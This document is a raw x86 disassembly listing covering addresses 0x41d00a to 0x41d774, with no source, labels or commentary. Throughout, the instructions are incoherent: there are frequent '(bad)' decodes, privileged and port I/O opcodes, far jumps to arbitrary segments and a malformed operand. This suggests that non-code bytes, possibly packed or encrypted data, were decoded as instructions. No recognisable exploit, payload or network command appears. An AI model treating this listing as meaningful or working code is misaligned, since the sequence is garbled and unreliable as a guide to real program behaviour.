  41d00a:	shl    DWORD PTR [eax+0x16de7dcd],1
  41d010:	xchg   esp,eax
  41d011:	fistp  DWORD PTR [edx]
  41d013:	ret    
  41d014:	imul   ecx,DWORD PTR [ecx+edx*4-0x40918728],0x23
  41d01c:	sub    BYTE PTR [ebp+0x7c5c997],ch
  41d022:	icebp  
  41d023:	fsubrp st(7),st
  41d025:	(bad)  
  41d026:	ins    DWORD PTR es:[edi],dx
  41d027:	lahf   
  41d028:	outs   dx,BYTE PTR ss:[esi]
  41d02a:	inc    ebx
  41d02b:	test   esp,0x2a76db2a
  41d031:	dec    esp
  41d032:	retf   0x6942
  41d035:	stos   BYTE PTR es:[edi],al
  41d036:	xchg   BYTE PTR [ebp-0x20a745d1],bh
  41d03c:	mov    edx,0xc6175da2
  41d041:	ret    0x15c0
  41d044:	outs   dx,DWORD PTR ds:[esi]
  41d045:	mov    edi,0x9de0801c
  41d04a:	adc    DWORD PTR [ebx-0xf],ecx
  41d04d:	jp     0x41d048
  41d04f:	enter  0xb9d7,0xfa
  41d053:	loopne 0x41d01f
  41d055:	int3   
  41d056:	imul   esp,DWORD PTR [ebx-0x22a79146],0x528cd044
  41d060:	lahf   
  41d061:	and    BYTE PTR cs:[ecx+0xe],ch
  41d065:	(bad)  
  41d067:	mov    esp,0x610fe457
  41d06c:	cmc    
  41d06d:	add    al,0x66
  41d06f:	inc    edi
  41d070:	int    0x15
  41d072:	jge    0x41d06b
  41d074:	(bad)  
  41d076:	repz iret 
  41d078:	inc    esi
  41d079:	repz xchg ebx,eax
  41d07b:	jp     0x41d075
  41d07d:	pop    eax
  41d07e:	stos   BYTE PTR es:[edi],al
  41d07f:	nop
  41d080:	mov    ebx,0x4b61097e
  41d085:	shl    esp,0x81
  41d088:	lds    edi,FWORD PTR [edx]
  41d08a:	jmp    0x41d07a
  41d08c:	push   ds
  41d08d:	jns    0x41d03c
  41d08f:	xchg   esi,eax
  41d090:	iret   
  41d091:	push   es
  41d092:	cld    
  41d093:	push   edx
  41d094:	sub    al,0x4b
  41d096:	inc    edx
  41d097:	mov    esp,0xd31527e6
  41d09c:	mov    eax,ds:0xc8c9aa4c
  41d0a1:	shl    BYTE PTR ds:0x5e612c57,1
  41d0a7:	adc    ecx,edi
  41d0a9:	hlt    
  41d0aa:	xor    edi,DWORD PTR [ebx-0x12b9e875]
  41d0b0:	sub    eax,0x9187ae8
  41d0b5:	bound  edx,QWORD PTR [eax+0x240be204]
  41d0bb:	add    eax,0x8cb8730
  41d0c0:	clc    
  41d0c1:	jns    0x41d122
  41d0c3:	stos   DWORD PTR es:[edi],eax
  41d0c4:	or     DWORD PTR [ebx-0x270f1997],esp
  41d0ca:	or     eax,0x18b9a2c6
  41d0cf:	jno    0x41d0fc
  41d0d1:	pop    ebp
  41d0d2:	push   ebx
  41d0d3:	pop    es
  41d0d4:	mov    cl,0x8b
  41d0d6:	jge    0x630f2848
  41d0dc:	pushf  
  41d0dd:	pop    ebp
  41d0de:	mov    ch,0xe2
  41d0e0:	das    
  41d0e1:	in     al,0x6
  41d0e3:	xor    esi,esi
  41d0e5:	fisubr WORD PTR [edi-0x2c]
  41d0e8:	jg     0x41d06d
  41d0ea:	sbb    DWORD PTR ds:0xdb97aca6,ebx
  41d0f0:	cmp    DWORD PTR [edx-0x2b],0xfffffffa
  41d0f4:	mov    esi,0x273885cd
  41d0f9:	(bad)  
  41d0fa:	or     dh,BYTE PTR [ebp+0x3dd3d22a]
  41d100:	and    ecx,ecx
  41d102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d103:	push   0xffffffb2
  41d105:	aaa    
  41d106:	or     ah,bh
  41d108:	cdq    
  41d109:	imul   edx,ebx,0x69
  41d10c:	in     eax,0x79
  41d10e:	lods   al,BYTE PTR ds:[esi]
  41d10f:	pop    ecx
  41d110:	mov    bl,0xb0
  41d112:	mov    edi,0x619413be
  41d117:	mov    cl,BYTE PTR [eax-0x5713fa3f]
  41d11d:	in     eax,0xed
  41d11f:	sbb    ah,cl
  41d121:	push   esp
  41d122:	mov    cl,0x46
  41d124:	jl     0x41d130
  41d126:	nop
  41d127:	shl    bh,0x56
  41d12a:	cmc    
  41d12b:	mov    dl,0xc8
  41d12d:	or     edi,DWORD PTR ds:[edi]
  41d130:	mov    DWORD PTR [edi+0x6a704211],eax
  41d136:	mov    ?,WORD PTR [edx-0x19]
  41d139:	or     BYTE PTR [ebp-0x2],dl
  41d13c:	add    ch,BYTE PTR [edx-0x7e60516f]
  41d142:	(bad)  
  41d143:	sub    al,0x1
  41d145:	xor    ch,BYTE PTR [edx-0x5d5ffd1a]
  41d14b:	xchg   DWORD PTR [edi],ebp
  41d14d:	or     ecx,DWORD PTR [eax-0x176d8dd9]
  41d153:	or     BYTE PTR [ecx],0xd2
  41d156:	sbb    al,0x5a
  41d158:	scas   al,BYTE PTR es:[edi]
  41d159:	pop    eax
  41d15a:	push   ebp
  41d15b:	rcl    BYTE PTR [edi+0x559157d3],cl
  41d161:	xor    BYTE PTR [ebx-0x75],al
  41d164:	pusha  
  41d165:	lods   eax,DWORD PTR ds:[esi]
  41d166:	pop    ebp
  41d167:	sbb    al,0xf
  41d169:	aam    0x76
  41d16b:	int    0x13
  41d16d:	adc    edx,DWORD PTR [edi-0x5424a160]
  41d173:	xchg   ebx,eax
  41d174:	mov    bl,0xf0
  41d176:	or     ebx,ecx
  41d178:	cmp    BYTE PTR [eax+0x43],0xa4
  41d17c:	dec    ecx
  41d17d:	push   es
  41d17e:	push   ds
  41d17f:	dec    esp
  41d180:	xor    DWORD PTR [esi],ecx
  41d182:	ss ds loopne 0x41d16b
  41d186:	xor    eax,0x3100a336
  41d18b:	aas    
  41d18c:	xor    al,0xb7
  41d18e:	push   es
  41d18f:	loop   0x41d187
  41d191:	ret    
  41d192:	lods   al,BYTE PTR ds:[esi]
  41d193:	ja     0x41d17f
  41d195:	jp     0x41d170
  41d197:	pop    ebp
  41d198:	dec    edx
  41d199:	xchg   esi,eax
  41d19a:	scas   al,BYTE PTR es:[edi]
  41d19b:	aaa    
  41d19c:	add    al,0x36
  41d19e:	aam    0xa7
  41d1a0:	inc    ebx
  41d1a1:	fucomip st,st(3)
  41d1a3:	in     al,dx
  41d1a4:	xchg   ecx,eax
  41d1a5:	push   edx
  41d1a6:	out    0x98,al
  41d1a8:	sub    DWORD PTR [eax],eax
  41d1aa:	xor    ebx,DWORD PTR [ebx+edi*1-0x28961ff2]
  41d1b1:	mov    esi,0xa752bcae
  41d1b6:	dec    edx
  41d1b7:	rcr    DWORD PTR [esi-0x1c1a300a],1
  41d1bd:	adc    eax,DWORD PTR [eax-0x67]
  41d1c0:	dec    edi
  41d1c1:	ror    BYTE PTR [eax-0x48],0x57
  41d1c5:	(bad)  
  41d1c6:	daa    
  41d1c7:	jae    0x41d19e
  41d1c9:	aas    
  41d1ca:	sub    DWORD PTR ds:0x646df02d,0xdba9168a
  41d1d4:	and    esp,ebx
  41d1d6:	mov    DWORD PTR [esp+edx*8],0x350096d7
  41d1dd:	xor    BYTE PTR [eax],cl
  41d1df:	mov    ecx,0x5eb29180
  41d1e4:	jecxz  0x41d1dd
  41d1e6:	mov    ecx,0x8e84a99f
  41d1eb:	adc    esi,ebp
  41d1ed:	mov    edi,0xdd22a97
  41d1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f3:	add    DWORD PTR [ebx],0x4e72bda0
  41d1f9:	stos   BYTE PTR es:[edi],al
  41d1fa:	scas   al,BYTE PTR es:[edi]
  41d1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1fc:	mov    esi,0x71d4cf5c
  41d201:	mov    ecx,0x16a4c41c
  41d206:	pop    ds
  41d207:	xchg   ecx,eax
  41d208:	sub    al,0xea
  41d20a:	sub    BYTE PTR [ebx+0x484ded5c],0x4
  41d211:	mov    al,0xed
  41d213:	xchg   edx,eax
  41d214:	push   ss
  41d215:	jge    0x41d1a8
  41d217:	pop    edi
  41d218:	cmp    BYTE PTR [ebx],bl
  41d21a:	xor    al,0x79
  41d21c:	inc    ecx
  41d21d:	loopne 0x41d213
  41d21f:	xchg   eax,ebx
  41d221:	and    al,0x2f
  41d223:	pop    esp
  41d224:	or     eax,0xd07dba53
  41d229:	int3   
  41d22a:	out    dx,eax
  41d22b:	std    
  41d22c:	jg     0x41d289
  41d22e:	inc    edi
  41d22f:	fwait
  41d230:	cli    
  41d231:	adc    BYTE PTR [edi+0x3f],bl
  41d234:	ret    0x59ad
  41d237:	jne    0x41d29c
  41d239:	cmp    cl,cl
  41d23b:	ds pop ebx
  41d23d:	fwait
  41d23e:	adc    ecx,ebp
  41d240:	popf   
  41d241:	bound  ecx,QWORD PTR [edx]
  41d243:	pop    ebx
  41d244:	pop    es
  41d245:	test   esp,0x3f5755eb
  41d24b:	les    ebp,FWORD PTR [ebp-0x6a]
  41d24e:	pop    edi
  41d24f:	pushf  
  41d250:	jg     0x41d23a
  41d252:	sub    cl,BYTE PTR [esi-0x5858ee5e]
  41d258:	adc    edx,ebp
  41d25a:	out    0xc,al
  41d25c:	or     ch,BYTE PTR [eax+edi*2-0x93606ea]
  41d263:	fs fcmovu st,st(3)
  41d266:	cmp    esp,eax
  41d268:	cmp    ecx,DWORD PTR [edx-0x1d]
  41d26b:	lods   eax,DWORD PTR ds:[esi]
  41d26c:	int    0xd0
  41d26e:	or     eax,0x56e4e1c6
  41d273:	mov    esi,0x8302b259
  41d278:	add    al,0x6f
  41d27a:	imul   edx,DWORD PTR [edi-0x360e3523],0xffffffff
  41d281:	retf   
  41d282:	mov    esp,0xd586519b
  41d287:	sub    esi,DWORD PTR [eax+0x69]
  41d28a:	add    al,0xae
  41d28c:	xchg   edi,eax
  41d28d:	sub    bl,BYTE PTR [ecx+0x4548d663]
  41d293:	mov    al,ds:0x2b8e7924
  41d298:	stc    
  41d299:	add    dh,BYTE PTR [ecx+0x58ed958c]
  41d29f:	scas   al,BYTE PTR es:[edi]
  41d2a0:	(bad)  
  41d2a1:	fcomp  st(5)
  41d2a3:	mov    dh,BYTE PTR ds:0x2a732c7d
  41d2a9:	fild   QWORD PTR [edx+0x6f70ce80]
  41d2af:	jb     0x41d2d5
  41d2b1:	sti    
  41d2b2:	fcomi  st,st(2)
  41d2b4:	xor    BYTE PTR [esi+0x63],cl
  41d2b7:	jne    0x41d280
  41d2b9:	mov    esp,DWORD PTR [esi-0x5d5a0cf]
  41d2bf:	loope  0x41d2fa
  41d2c1:	xchg   esp,eax
  41d2c2:	mov    dh,0x8c
  41d2c4:	dec    ebp
  41d2c5:	mov    ch,0xb7
  41d2c7:	pop    esi
  41d2c8:	inc    esi
  41d2c9:	(bad)  
  41d2ca:	imul   eax,DWORD PTR [edi-0x7b],0xd
  41d2ce:	push   esi
  41d2cf:	les    edi,FWORD PTR gs:[edx-0x41aa2c4]
  41d2d6:	pop    ss
  41d2d7:	pop    ebp
  41d2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d9:	ins    DWORD PTR es:[edi],dx
  41d2da:	xor    esi,edx
  41d2dc:	sub    DWORD PTR [edx+0x75],ecx
  41d2df:	mov    ebx,0x97806aa7
  41d2e4:	mov    al,0x70
  41d2e6:	(bad)  
  41d2e7:	aas    
  41d2e8:	xor    cl,BYTE PTR [edi-0x9]
  41d2eb:	cmp    DWORD PTR [edx+eax*1-0x1b],eax
  41d2ef:	xchg   ebp,eax
  41d2f0:	pop    edi
  41d2f1:	(bad)  
  41d2f2:	and    DWORD PTR [edi],eax
  41d2f4:	mov    ds:0x508e1659,eax
  41d2f9:	ss ja  0x41d344
  41d2fc:	jge    0x41d2d1
  41d2fe:	jg     0x41d36d
  41d300:	mov    bl,0x6e
  41d302:	imul   ebx,ebp,0xffffffd8
  41d305:	fxch   st(7)
  41d307:	fdivrp st(7),st
  41d309:	mov    al,0xf5
  41d30b:	pop    ds
  41d30c:	jbe    0x41d31b
  41d30e:	jle    0x41d2aa
  41d310:	bound  ecx,QWORD PTR [edx-0x59]
  41d313:	mov    al,ds:0xdb7e93bf
  41d318:	and    edi,DWORD PTR [ebp+0x3e]
  41d31b:	loopne 0x41d361
  41d31d:	repnz xchg ecx,eax
  41d31f:	jmp    0x41d384
  41d321:	cs cmp al,0xca
  41d324:	mov    dl,BYTE PTR ds:0x692a5792
  41d32a:	add    BYTE PTR [ebp+0xb],ch
  41d32d:	sbb    DWORD PTR [ebx],edx
  41d32f:	cmp    bh,BYTE PTR [edi+0x5d6667ff]
  41d335:	out    0x26,al
  41d337:	or     ecx,ebp
  41d339:	sbb    esi,DWORD PTR [ecx-0x2d5e40be]
  41d33f:	pop    edi
  41d340:	and    eax,0x3d87fd3e
  41d345:	inc    eax
  41d346:	jmp    0x41d38b
  41d348:	push   0xbbffbf30
  41d34d:	fcom   QWORD PTR [ebx-0x67]
  41d350:	add    ebp,edi
  41d352:	push   ds
  41d353:	jmp    0x1e14:0x4f48137a
  41d35a:	stos   DWORD PTR es:[edi],eax
  41d35b:	mov    DWORD PTR [edi-0x6f],ebp
  41d35e:	fsub   QWORD PTR [edx+0x57]
  41d361:	add    eax,0x6de38d55
  41d366:	in     al,dx
  41d367:	int    0xe8
  41d369:	scas   al,BYTE PTR es:[edi]
  41d36a:	mov    eax,esi
  41d36c:	shl    BYTE PTR [ebp+0x56],cl
  41d36f:	cld    
  41d370:	sub    DWORD PTR [edx],edx
  41d372:	jl     0x41d364
  41d374:	lods   eax,DWORD PTR ds:[esi]
  41d375:	aas    
  41d376:	xchg   ecx,eax
  41d377:	int    0x3b
  41d379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d37a:	or     dl,cl
  41d37c:	push   0x10
  41d37e:	dec    esp
  41d37f:	enter  0x22e4,0x4
  41d383:	sbb    ch,BYTE PTR [edi+0x46]
  41d386:	xchg   edx,eax
  41d387:	or     BYTE PTR ds:0x7b63186,bh
  41d38d:	push   ebp
  41d38e:	das    
  41d38f:	ficom  DWORD PTR [ecx+0x147095c5]
  41d395:	sub    al,ah
  41d397:	ins    DWORD PTR es:[edi],dx
  41d398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d399:	push   edx
  41d39a:	arpl   di,di
  41d39c:	dec    ebp
  41d39d:	iret   
  41d39e:	xor    DWORD PTR fs:[edx],eax
  41d3a1:	das    
  41d3a2:	cdq    
  41d3a3:	add    al,0xee
  41d3a5:	out    dx,eax
  41d3a6:	daa    
  41d3a7:	aas    
  41d3a8:	sub    dl,BYTE PTR [ecx]
  41d3aa:	fs fwait
  41d3ac:	(bad)  
  41d3ad:	icebp  
  41d3ae:	dec    ecx
  41d3af:	test   eax,0x7c054e1c
  41d3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3b5:	push   ebx
  41d3b6:	iret   
  41d3b7:	cmp    BYTE PTR [eax+0x7dd20074],bh
  41d3bd:	sub    al,ah
  41d3bf:	xchg   ebx,eax
  41d3c0:	cmp    al,0x4b
  41d3c2:	cld    
  41d3c3:	les    esi,FWORD PTR [ebp+0xe98a2de]
  41d3c9:	or     BYTE PTR [eax-0x33],cl
  41d3cc:	push   ds
  41d3cd:	rcr    esi,0xe7
  41d3d0:	push   eax
  41d3d1:	popf   
  41d3d2:	shr    BYTE PTR [ebp-0x1e],0xd9
  41d3d6:	sar    DWORD PTR [edx+0x7d],0x40
  41d3da:	cdq    
  41d3db:	xchg   edx,eax
  41d3dc:	xchg   BYTE PTR [esi-0x17],bh
  41d3df:	dec    ebx
  41d3e0:	ins    BYTE PTR es:[edi],dx
  41d3e1:	std    
  41d3e2:	cli    
  41d3e3:	and    al,0x3d
  41d3e5:	dec    esi
  41d3e6:	adc    BYTE PTR [edx-0x30597c18],ah
  41d3ec:	repnz pop ecx
  41d3ee:	sub    dh,0x0
  41d3f1:	or     bh,dh
  41d3f3:	popf   
  41d3f4:	inc    ebx
  41d3f5:	mov    eax,ds:0x9ee0d837
  41d3fa:	mov    dh,0xa6
  41d3fc:	sbb    dh,BYTE PTR [ecx-0x4d]
  41d3ff:	loopne 0x41d3f5
  41d401:	inc    ebx
  41d402:	sbb    DWORD PTR [ebx],esi
  41d404:	outs   dx,BYTE PTR ds:[esi]
  41d405:	sar    BYTE PTR [edx+0x1914596],0x98
  41d40c:	pop    edi
  41d40d:	push   eax
  41d40e:	cmp    eax,0x56241d04
  41d413:	fwait
  41d414:	loopne 0x41d429
  41d416:	mov    esi,0x7666a9e6
  41d41b:	sbb    eax,0x16d97ed2
  41d420:	fadd   st,st(3)
  41d422:	es pusha 
  41d424:	popf   
  41d425:	jns    0x41d3f5
  41d427:	mov    ds:0x99ac073e,al
  41d42c:	fcom   st(7)
  41d42e:	jo     0x41d3cc
  41d430:	add    al,0xd8
  41d432:	pop    edx
  41d433:	sub    DWORD PTR [edx],edx
  41d435:	jl     0x41d407
  41d437:	leave  
  41d438:	iret   
  41d439:	xchg   ebp,eax
  41d43a:	dec    ecx
  41d43b:	es daa 
  41d43d:	cmp    BYTE PTR [ebx],bl
  41d43f:	jle    0x41d468
  41d441:	mov    eax,ds:0x5588ba94
  41d446:	mov    bl,0x2
  41d448:	add    BYTE PTR [ebx+0x6d],bh
  41d44b:	(bad)  [ecx+0xf]
  41d44e:	xlat   BYTE PTR ds:[ebx]
  41d44f:	fwait
  41d450:	loop   0x41d3e2
  41d452:	lahf   
  41d453:	aas    
  41d454:	dec    esp
  41d455:	sbb    ebx,DWORD PTR [ebp-0x29d58c2b]
  41d45b:	lahf   
  41d45c:	cdq    
  41d45d:	call   0x6838f6d1
  41d462:	retf   
  41d463:	jmp    0x32b2f1e4
  41d468:	xlat   BYTE PTR ds:[ebx]
  41d469:	aad    0x75
  41d46b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d46c:	push   eax
  41d46d:	xchg   ebp,eax
  41d46e:	cdq    
  41d46f:	jp     0x41d422
  41d471:	(bad)  [ebx+0x34]
  41d474:	cdq    
  41d475:	inc    esp
  41d476:	rcr    DWORD PTR [edi-0xb],1
  41d479:	ret    0xd60e
  41d47c:	test   BYTE PTR [eax],0xf5
  41d47f:	aad    0xc8
  41d481:	adc    bl,dl
  41d483:	stos   BYTE PTR es:[edi],al
  41d484:	xor    al,0x8c
  41d486:	mov    dl,0x3d
  41d488:	xlat   BYTE PTR ds:[ebx]
  41d489:	popf   
  41d48a:	dec    edi
  41d48b:	retf   
  41d48c:	retf   0x5a52
  41d48f:	mov    dl,BYTE PTR ds:0x645280de
  41d495:	inc    esp
  41d496:	dec    eax
  41d497:	mov    eax,DWORD PTR [ebx+0x58e40cb7]
  41d49d:	js     0x41d4d5
  41d49f:	and    dl,BYTE PTR [edx]
  41d4a1:	ror    cl,0x59
  41d4a4:	xor    bl,dh
  41d4a6:	jnp    0x41d519
  41d4a8:	(bad)  
  41d4aa:	fiadd  DWORD PTR [edi+ebx*4-0x505f7a5f]
  41d4b1:	icebp  
  41d4b2:	push   ecx
  41d4b3:	sub    BYTE PTR [ebx],al
  41d4b5:	adc    DWORD PTR [ecx+0x733d8de3],edi
  41d4bb:	bound  edx,QWORD PTR [ecx+0x613be869]
  41d4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4c2:	lock es fdiv st(5),st
  41d4c6:	pop    edx
  41d4c7:	pusha  
  41d4c8:	sbb    eax,0x3fa9509e
  41d4cd:	sub    ecx,DWORD PTR [ebp+edi*8-0x2a]
  41d4d1:	xchg   esi,eax
  41d4d2:	outs   dx,DWORD PTR ds:[esi]
  41d4d3:	scas   al,BYTE PTR es:[edi]
  41d4d4:	ins    DWORD PTR es:[edi],dx
  41d4d5:	dec    edi
  41d4d6:	fld    DWORD PTR [edi]
  41d4d8:	into   
  41d4d9:	xchg   edi,eax
  41d4da:	dec    esi
  41d4db:	(bad)  
  41d4dc:	mov    ebx,0x10ec88ea
  41d4e1:	push   edi
  41d4e2:	and    eax,0x7a798fe7
  41d4e7:	lods   al,BYTE PTR ds:[esi]
  41d4e8:	or     BYTE PTR [ebx+0x283a46ef],dl
  41d4ee:	pop    edi
  41d4ef:	rcr    DWORD PTR [edi+0x40],cl
  41d4f2:	stc    
  41d4f3:	cmp    bh,BYTE PTR [eax]
  41d4f5:	pop    ebx
  41d4f6:	jae    0x41d4ae
  41d4f8:	mov    ds:0x6fb3c58d,al
  41d4fd:	(bad)  
  41d4ff:	jnp    0x41d4b2
  41d501:	aas    
  41d502:	loope  0x41d4c4
  41d504:	dec    edx
  41d505:	leave  
  41d506:	sub    al,0x41
  41d508:	ret    0xf6aa
  41d50b:	mov    al,0x47
  41d50d:	jae    0x41d4ed
  41d50f:	push   ecx
  41d510:	lea    edx,[eax]
  41d512:	popa   
  41d513:	sub    dh,ch
  41d515:	shl    edx,cl
  41d517:	sti    
  41d518:	fisub  WORD PTR [edx+0x6d80d477]
  41d51e:	outs   dx,DWORD PTR ds:[esi]
  41d51f:	call   0x7ad1:0x3994f3ee
  41d526:	dec    ebp
  41d527:	lods   eax,DWORD PTR ds:[esi]
  41d528:	pop    ebx
  41d529:	shl    BYTE PTR ds:0xa832976f,0x0
  41d530:	and    BYTE PTR [edi-0x2c492c59],ah
  41d536:	ror    bh,0x32
  41d539:	sbb    BYTE PTR [edi+edi*1+0x4827a897],ch
  41d540:	and    bl,bh
  41d542:	pop    ebp
  41d543:	lods   al,BYTE PTR ds:[esi]
  41d544:	je     0x41d573
  41d546:	adc    DWORD PTR [ebp-0x6b0bf477],esi
  41d54c:	mov    dh,0x8e
  41d54e:	shl    BYTE PTR [edx],0xcc
  41d551:	mov    esp,ebx
  41d553:	mov    bh,0xc8
  41d555:	jle    0x41d4e3
  41d557:	jl     0x41d55f
  41d559:	jge    0x41d58b
  41d55b:	add    ah,BYTE PTR [edi-0x668c9bc]
  41d561:	pop    eax
  41d562:	daa    
  41d563:	jmp    0x41d4fa
  41d565:	mov    ecx,0x9ae67c6a
  41d56a:	fdivr  DWORD PTR [edx-0x48]
  41d56d:	sub    eax,0x4836ed2f
  41d572:	js     0x41d51f
  41d574:	ins    DWORD PTR es:[edi],dx
  41d575:	ja     0x41d520
  41d577:	dec    BYTE PTR [edi+edx*8-0x4d7d9c04]
  41d57e:	in     al,dx
  41d57f:	push   esp
  41d580:	xchg   ecx,eax
  41d581:	adc    BYTE PTR [ebx],cl
  41d583:	(bad)  
  41d584:	and    al,dl
  41d586:	sbb    al,0xec
  41d588:	push   edx
  41d589:	mov    al,0x95
  41d58b:	inc    ebx
  41d58c:	push   edx
  41d58d:	mov    ds:0x18bc1d95,eax
  41d592:	push   eax
  41d593:	mov    esp,0xf1e7d76
  41d598:	xor    bl,BYTE PTR [esi]
  41d59a:	mov    BYTE PTR [ebx+0x34],dl
  41d59d:	scas   eax,DWORD PTR es:[edi]
  41d59e:	outs   dx,BYTE PTR ds:[esi]
  41d59f:	dec    ebx
  41d5a0:	mov    edx,0x676e2ced
  41d5a5:	cwde   
  41d5a6:	sbb    ebp,DWORD PTR [esi-0xc]
  41d5a9:	sub    ch,BYTE PTR [edi]
  41d5ab:	push   cs
  41d5ac:	cmovne edx,eax
  41d5af:	ins    DWORD PTR es:[edi],dx
  41d5b0:	gs cmp esp,ebp
  41d5b3:	inc    esi
  41d5b4:	add    eax,0x83761182
  41d5b9:	and    al,0x88
  41d5bb:	inc    esi
  41d5bc:	xor    eax,0x371fa793
  41d5c1:	sbb    dh,dh
  41d5c3:	jle    0x41d551
  41d5c5:	call   0x3765:0xed0a2319
  41d5cc:	call   0x3345f9fc
  41d5d1:	sub    al,0x27
  41d5d3:	popa   
  41d5d4:	mov    dh,0xcc
  41d5d6:	aam    0x3e
  41d5d8:	hlt    
  41d5d9:	and    eax,ecx
  41d5db:	push   ss
  41d5dc:	int3   
  41d5dd:	in     al,0x5c
  41d5df:	mov    ds:0x2c03eca,eax
  41d5e4:	lods   eax,DWORD PTR ds:[esi]
  41d5e5:	jae    0x41d5a5
  41d5e7:	sub    ah,ah
  41d5e9:	or     BYTE PTR ds:[ecx+edi*1-0x314358ec],dl
  41d5f1:	call   0xc16a:0x95190dc1
  41d5f8:	push   edi
  41d5f9:	cmp    ch,BYTE PTR [ebx-0x304d7218]
  41d5ff:	sar    ebp,0x66
  41d602:	jle    0x41d604
  41d604:	or     ebp,ecx
  41d606:	cmp    eax,0x32d8e8a4
  41d60b:	popf   
  41d60c:	dec    esi
  41d60d:	frstor [edx+0x8]
  41d610:	adc    al,0xe8
  41d612:	and    esp,DWORD PTR [esi]
  41d614:	dec    ecx
  41d615:	scas   eax,DWORD PTR es:[edi]
  41d616:	and    esp,DWORD PTR [eax]
  41d618:	dec    ecx
  41d619:	inc    ebp
  41d61a:	and    DWORD PTR [ecx+0x54],eax
  41d61d:	fdivr  QWORD PTR cs:[eax-0x7c525cc9]
  41d624:	cmp    BYTE PTR [ebx+0x2e966cb8],0xa0
  41d62b:	data16 sbb BYTE PTR [eax],dl
  41d62e:	loopne 0x41d620
  41d630:	xchg   edx,eax
  41d631:	xor    al,BYTE PTR [esi]
  41d633:	sub    bh,ch
  41d635:	aas    
  41d636:	enter  0x1e50,0x9d
  41d63a:	dec    edx
  41d63b:	pusha  
  41d63c:	pushf  
  41d63d:	adc    al,0x66
  41d63f:	div    DWORD PTR es:[edi+0x75]
  41d643:	fbld   TBYTE PTR [eax+edi*2]
  41d646:	sub    al,0xf2
  41d648:	inc    ebx
  41d649:	ja     0x41d602
  41d64b:	xrelease mov DWORD PTR [ebp+0x58],eax
  41d64f:	bound  esp,QWORD PTR [eax]
  41d651:	imul   edx,DWORD PTR [edx-0x1c00002d],0x9be3d56
  41d65b:	arpl   WORD PTR [edi+0x5b44f3f4],bp
  41d661:	or     eax,0x78a321d4
  41d666:	inc    dh
  41d668:	xchg   esi,eax
  41d669:	enter  0x7d18,0x71
  41d66d:	cmc    
  41d66e:	cdq    
  41d66f:	mov    esi,0xa4ec1c6b
  41d674:	sti    
  41d675:	scas   al,BYTE PTR es:[edi]
  41d676:	aam    0xe5
  41d678:	push   es
  41d679:	ret    0x8b7e
  41d67c:	add    eax,0x8524f2df
  41d681:	popf   
  41d682:	jnp    0x41d612
  41d684:	fwait
  41d685:	aad    0x3b
  41d687:	ror    BYTE PTR [edi+0x42608e96],1
  41d68d:	xchg   DWORD PTR [ebx],ecx
  41d68f:	fnstsw WORD PTR [edi]
  41d691:	iret   
  41d692:	push   ecx
  41d693:	fidivr WORD PTR [eax]
  41d695:	mov    BYTE PTR [edi],0x28
  41d698:	adc    DWORD PTR [edi+0x6f],0xffffffff
  41d69c:	xor    BYTE PTR fs:0x3525cafe,al
  41d6a3:	and    DWORD PTR [edi+0x3e],ebx
  41d6a6:	mov    esi,0x7c69649c
  41d6ab:	push   edx
  41d6ac:	int    0xd2
  41d6ae:	sahf   
  41d6af:	xor    al,0xa9
  41d6b1:	popa   
  41d6b2:	mov    ebx,0x56570152
  41d6b7:	cmp    bl,bh
  41d6b9:	and    BYTE PTR es:[esi+ecx*4],ch
  41d6bd:	and    al,ch
  41d6bf:	ret    
  41d6c0:	cs test al,0xf7
  41d6c3:	push   esp
  41d6c4:	fimul  DWORD PTR [ecx-0x6d995eee]
  41d6ca:	mov    ds:0x55452789,al
  41d6cf:	sbb    DWORD PTR [ecx-0x1a],esp
  41d6d2:	xlat   BYTE PTR ds:[ebx]
  41d6d3:	mov    al,ds:0x11b18ebd
  41d6d8:	fild   WORD PTR [edx+ebp*1]
  41d6db:	sbb    eax,0xbe7fac17
  41d6e0:	cmp    BYTE PTR [esi-0x17],0x1
  41d6e4:	enter  0x88c6,0xa7
  41d6e8:	cld    
  41d6e9:	xchg   ecx,eax
  41d6ea:	out    dx,eax
  41d6eb:	pop    eax
  41d6ec:	add    cl,BYTE PTR [eax+0x309dcf93]
  41d6f2:	xchg   sp,ax
  41d6f4:	je     0x41d6d6
  41d6f6:	into   
  41d6f7:	add    BYTE PTR [edi],bl
  41d6f9:	lods   eax,DWORD PTR ds:[esi]
  41d6fa:	mov    edi,0x87c1675a
  41d6ff:	xchg   esi,eax
  41d700:	gs sbb al,0x87
  41d703:	imul   ecx,esp,0x8187e6aa
  41d709:	or     edx,DWORD PTR ds:0x3b345bf6
  41d70f:	mov    ds:0xbeabfd59,eax
  41d714:	cwde   
  41d715:	rol    BYTE PTR [ebx+0x42],cl
  41d718:	in     al,dx
  41d719:	inc    esi
  41d71a:	out    dx,eax
  41d71b:	cmp    BYTE PTR [eax+0x50],bh
  41d71e:	mul    DWORD PTR [esi+0x4e46debd]
  41d724:	ss ror ebx,1
  41d727:	add    BYTE PTR [eax+0x43],dh
  41d72a:	and    dh,BYTE PTR [ecx+0x77]
  41d72d:	or     BYTE PTR [ebp+0x26],al
  41d730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d731:	js     0x41d6bd
  41d733:	mov    edx,DWORD PTR [ebx]
  41d735:	out    dx,al
  41d736:	loope  0x41d791
  41d738:	imul   esp,DWORD PTR ds:0x250df7e,0x60af6eca
  41d742:	fnstcw WORD PTR [bx+0x69]
  41d746:	enter  0xa72d,0x8b
  41d74a:	sub    eax,0x9a223a4d
  41d74f:	out    dx,al
  41d750:	ins    BYTE PTR es:[edi],dx
  41d751:	jnp    0x41d79c
  41d753:	loope  0x41d6d7
  41d755:	xchg   esi,eax
  41d756:	cmp    eax,0x962a7a8a
  41d75b:	mov    dh,0xd2
  41d75d:	mov    ebx,0x34367631
  41d762:	dec    edx
  41d763:	popa   
  41d764:	sti    
  41d765:	dec    edi
  41d766:	loope  0x41d6f2
  41d768:	shl    ecx,cl
  41d76a:	imul   esp,DWORD PTR [eax+0x18ba847b],0xdecc1055
  41d774:	push   esp
